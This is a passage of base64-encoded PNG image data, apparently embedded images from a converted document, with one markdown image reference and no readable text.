AOCZ+NUC6/83ZuLx0zgvUew2/7o6uZRrLcsu/fzMENihzXX7QGAB4IlZIbC8ri7gwrf/ujrLnnrGrW2UsO7VmPf6JWI7n0Ob6/IhsADwxKwS2OwY3eEcuhODLLD6Ryzu4HV1NXV55I+c9HfJerYZzpVyFiyBtQY50Qa9WaRgJLD+HlUflZ0/36uwYtaBzRFYAHghVgosOLzA6gECAADAgsDeQZhx8hgJAABYILA3U5Z37eVfAAAABBYAAGAKCCwAAMAEEFgAAIAJPERg02MeVVB8TMV4+mM98RGP3iYGsJ768R9eVwcAcC8bE9gLz56+iMD2nju9iLX5xJWk51bNXz2vjheBBQDoMU9gV3FBYF+EnxdYZ9cDr6sDAPhBVgtss5NPFli5S1G7i1AdXmY/TXzqfrmE2c7C2jh5XZ0MOr7G6+rUvsq9XaYAALbAKoHtbbUXNS1ibdMXhdByyJ5LM9gYPtyLOAgDr6sTIcdXeF1dHPBcEScAwBZYIbCv8zadFJ+cFemwXl7ShvkuJ3rz/EvoPFXkWa5hp6HA9lD18MSvq0urGJfyBACwBX61wPr/jZl4/DTOSxQ7XlfX3jsS2KHNdfvobPbv76kGQwAA22OFwPK6ukBYsuR1dca9fonYzufQ5rp8HYH1xO9rx7kDAPh3rBLY7Bjd4ZycE4MssPpHLO6QQqvCtZPMS6TyPmNZ8U2KhIpTiL0WgHbGJNLidXUVI4HNs0hl9xz+8NfV6XbVlgsAYEusFFhweIHVAwQAAIAFgb2DMKNqHxkCAABAYFdQlnft5V8AAAAEFgAAYAoILAAAwAQQWAAAgAk8RGDTYx5VUHxMxXj6Yz3xEY/eJgZwO/KxH11Xo7ARo40mAAB+CxsT2AvPnr6IwPaeO72ItfnElaTnVu1fPY/sPgqzQWABAGYK7Cpud+bPyM8LrLProfu6urHdR2E2CCwAwB0C2+zkkwVW7lJk7bajdmWSewbL+NT91XJlMwtr43y219X99Xsa1/H6dHyaOp/xqBK0dnJKQUfzdXXigoGIdsJ0WUS6QWCFza08AQC8OKsEtrfVXtS0iLVNXxTCxlsnOs48E8OHexEHB8/r6kTIcfy6urHdR2EFZ1dp47KF5HX3AwC8GisE9nXeppNF1JwVjvOSBMXlRIrLNeg8VeSZoWGnocD2UPVgvK5uXNZeWDurToMTvUQ8GtQAALwqv1pgezPx+Gmclyh2r/C6unFZ7TC9TC5FFIEFAFglsLyuLuDCX+N1deOyWmHK5vnX3QgsAEBilcBmMXKHc+hODLLAtkuHvK5OB9blCdeEMkgh8gOAqa+r69jVD2A6YXk8ImfGh7PtykADgQUAWC2w4PACqwcIAAAACwJ7B2HG2T4yBAAAgMCuoCyd2su/AAAACCwAAMAUEFgAAIAJILAAAAATeIjAmhtNxMc4Ro+53MyLvE1nS8jHfnRdjcJG6Md0LNw1/AIbAF6ZjQnshWdPX0Rg9bO5V2NtPnElPs3ur55Hdh+F2VwjsDziBACvzjyBXcXtzvwZ+XmBdXbd1uvqEFgAeHVWC2yaEeUjC6zcAajdRagOf8uC0cSn7q+WK5tZWBsnr6uTQU/0ujq1d/IloQYA2CqrBLZstRewZ7DWNn1RCBtvneg480wMH+5FHL/f43V1JeT4LK+ri4MaXQAAgCdkhcC+ztt0soias8JxXpKguJxIcbkGnaeKX/66urRSce31AABb5VcL7PfnuzkTj5/GeYlix+vqyudHCGwirTy8xZUIAIBnY4XAvtDr6j52Ikx/B2oLS8GF87q68HHS6+rO8b6/W3YCANg+qwQ2i5E7nEN3YpAFtl063O7r6j55XZ1l13/2ujrdds55/2qMBwDwFKwUWHB4gdUDBAAAgAWBvYMw22ofGQIAAEBgV1CWTu3lXwAAAAQWAABgCggsAADABBBYAACACTxEYM2NJuJjHKPHXG7mRd6m8zuI31XzK2sA+KVsTGAvPHv6IgKrn829GmvziStJOyP93K+eEVgA+N3ME9hVXBDYF+HnBdbZdfS6OgAAeDSrBTbvFZuOLLByB6B2F6E6vMxwmvjU/XIHo3YW1sbJ6+pkkP26uso25/tOsQ7KCkGdbrUbU9y9q6oXscvTbmflMaLs0O5eJeJMde33aD4uRys9AIANskpgy1Z7AXsGa23TF0Wg6xkvzWBj+HAv4uCkeV2dCDnar6sLtnF1VMTdnQu2iwOMHJn6rL8CMPJmljOKqzuth0kNci/iJMqlIpv0AAC2xAqBve9tOu/mC78TawTWpbPubTopPjlj0mG9vKQN811O2s3zx+g8VeTZnWGnVaKi6kG8rq7ko1yTBbYz2x4JqsYqp3VOkgZE5Yh20IMa/RkAYGP8aoH97a+ruyiwo7SuyItVTutcxoumKLdsL1pQ9WcAgI2xQmDve12dW8bsLdE6Rku4WfSGS8TpM6+rc1j2TDPuocBGe+h7M1b+FNr28WQWUW2WYLNSPr/UzwwWAJ6UVQKbxcgdzsk6x5gFVoTlQwqtCtdOulqaTPcZS7lvUvxUnELstZOvPv/y19X9byiw/kK1TCzyMhDYYBd5n8qrmlXrwVE5736AhcACwHOyUmDB4YWkIzIAAPC7QWBXE2ac7SNDAAAACOwKyjKmvfwLAACAwAIAAEwBgQUAAJgAAgsAADCB/wNvDCAhEBLW/wAAAABJRU5ErkJggg==>

[image4]: <data:image/png;base64,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>
